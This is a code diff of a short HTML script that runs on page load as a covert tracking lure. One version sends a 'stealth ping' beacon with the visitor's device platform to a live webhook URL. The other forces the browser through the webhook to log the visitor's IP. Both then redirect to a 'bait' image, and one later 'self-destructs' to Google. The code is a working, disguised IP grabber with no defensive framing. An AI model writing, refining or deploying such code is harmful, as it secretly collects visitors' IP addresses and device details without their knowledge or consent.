@@ -1,20 +1,11 @@
 <script>
     function runPayload() {
-        // THE NEW, LIVE ID FROM YOUR SCREENSHOT
-        var webhookURL = "https://webhook.site/6fae6e2c-a6c9-4848-85fc-38146e2feba2?status=landed&device=" + navigator.platform;
-
-        // THE STEALTH PING
-        navigator.sendBeacon(webhookURL);
-
-        // THE BAIT (Redirect to image after 1.2s)
-        setTimeout(function() {
-            window.location.href = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
-        }, 1200);
-
-        // SELF-DESTRUCT (Go to Google after 23s)
-        setTimeout(function() {
-            window.location.href = "https://www.google.com";
-        }, 23000);
+        const bait = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
+        const hook = "https://webhook.site/6fae6e2c-a6c9-4848-85fc-38146e2feba2";
+        
+        // This forces the browser to visit the webhook, which MUST log the IP, 
+        // and then redirects to your image.
+        window.location.href = hook + "?redirect=" + encodeURIComponent(bait);
     }
     window.onload = runPayload;
 </script>
